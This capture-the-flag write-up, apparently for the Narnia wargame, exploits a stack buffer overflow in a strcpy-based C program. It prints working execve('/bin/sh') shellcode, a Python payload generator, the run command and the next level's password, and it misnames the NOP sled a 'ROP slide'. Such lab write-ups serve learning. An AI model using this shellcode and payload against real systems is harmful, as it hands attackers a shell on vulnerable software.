# Overview
We get the following C code:
```c
/*
   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2 of the License, or
   (at your option) any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char * argv[]){
    char buf[128];

    if(argc == 1){
        printf("Usage: %s argument\n", argv[0]);
        exit(1);
    }
    strcpy(buf,argv[1]);
    printf("%s", buf);

    return 0;
}
```

That's a classic stack buffer overflow.

# Exploiting a classic stack buffer overflow
I guess the best resource out there is the old Phrack article [Smashing The Stack For Fun And Profit](https://phrack.org/issues/49/14). Although I was more or less clear about how to exploit such an overflow, I missed something quite important. Thanks to the buffer overflow we can overwrite parts of the stack, and most notably the return address which allows to execute our shellcode. However the return address is not a relative offset, it's an absolute address.

To jump to our shellcode, we need to guess (approximately) what is the value of esp. And that depends on several things:
- Of course if ASLR is enabled, stack addresses would be random. But it is not the case on the CTF machine, so we can forget about it.
- In theory the base address of the stack is the same for all programs on a given architecture.
- But depending on the number of frames in the stack prior to the bug being triggered, esp will vary. Here the bug is triggered in main(), that makes things easier.
- **IMPORTANT:** when running the program in gdb, esp is modified (I guess gdb puts extra stuff in the stack).
- esp may also vary based on other parameters which I don't know about.

Jumping exactly to the beginning of the shellcode would be quite tricky. Hence, people generally put a ROP slide in front of their shellcode. That makes things easier, instead of guessing the exact address of the shellcode, you have to guess it approximately.

You can for instance use the following C program to print the value of ESP:
```c
#include <stdio.h>

unsigned int get_sp(void) {
   __asm__("movl %esp,%eax");
}

int main(void) {
    printf("0x%x\n", get_sp());
}
```

To compile it, run `gcc -o printesp printesp.c -m32 -fno-stack-protector -Wl,-z,norelro`.

# Shellcode
I re-use the same shellcode as before:
```
0:  31 c0                   xor    eax,eax
2:  31 db                   xor    ebx,ebx
4:  31 c9                   xor    ecx,ecx
6:  66 b9 b3 36             mov    cx,0x36b3
a:  66 bb b3 36             mov    bx,0x36b3
e:  b0 46                   mov    al,0x46
10: cd 80                   int    0x80
12: 31 db                   xor    ebx,ebx
14: 31 c9                   xor    ecx,ecx
16: 99                      cdq
17: 6a 0b                   push   0xb
19: 58                      pop    eax
1a: 51                      push   ecx
1b: 68 2f 2f 73 68          push   0x68732f2f
20: 68 2f 62 69 6e          push   0x6e69622f
25: 89 e3                   mov    ebx,esp
27: 51                      push   ecx
28: 89 e2                   mov    edx,esp
2a: 53                      push   ebx
2b: 89 e1                   mov    ecx,esp
2d: cd 80                   int    0x80
```

**One important thing**, the shellcode pushes from data to the stack. We need to make sure the stack layout allows for it. In a normal execution, the stack layout is `| buf (128 bytes) | saved ebp (4 bytes) | return address (4 bytes) |`. My initial idea was to write the following to the stack: `| ROP slide (81 bytes) | Shellcode (47 bytes) | address (4 bytes) | address (4 bytes) |`. However the shellcode would then push stuff to the stack, and overwrite itself :(

So I instead used the payload `| ROP slide (61 bytes) | Shellcode (47 bytes) | Random stuff (20 bytes) | address (4 bytes) | address (4 bytes) |`, where random stuff will be overwritten.

# Debugging commands
```
set disassembly-flavor intel
tui new-layout foobar {-horizontal asm 2 regs 1} 2 status 0 cmd 1
layout foobar
break *main+82
```

# Guessing the correct address
You can use the following python script to generate the payload:
```python
import argparse
import sys


def read_address(address):
    if address.startswith('0x'):
        address = address[2:]

    foo = bytearray.fromhex(address)
    foo.reverse()
    return(bytes(foo))


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('address')
    args = parser.parse_args()

    payload  = b'\x90' * 61 
    payload += b'\x31\xC0\x31\xDB\x31\xC9\x66\xB9'
    payload += b'\xB3\x36\x66\xBB\xB3\x36\xB0\x46'
    payload += b'\xCD\x80\x31\xDB\x31\xC9\x99\x6A'
    payload += b'\x0B\x58\x51\x68\x2F\x2F\x73\x68'
    payload += b'\x68\x2F\x62\x69\x6E\x89\xE3\x51'
    payload += b'\x89\xE2\x53\x89\xE1\xCD\x80'
    payload += b'\x90' * 20  
    payload += read_address(args.address) * 2

    sys.stdout.buffer.write(payload)


if __name__ == "__main__":
    main()
```

Then run it as such:
```
/narnia/narnia2 $(python3 gen_payload.py 0xffffd108)
```

After some trial and error, the program should jump somewhere in the ROP slide then execute the shellcode.

Interestingly, when running the C program above it told me that ESP was at 0xffffd288. So I supposed we could exploit the vulnerable program by using an address such as 0xffffd218 (to account for buf). But that didn't work, 0xffffd108 did work, I'm not sure why the address is different.

# The end
Password for the next level is `2xszzNl6uG`.
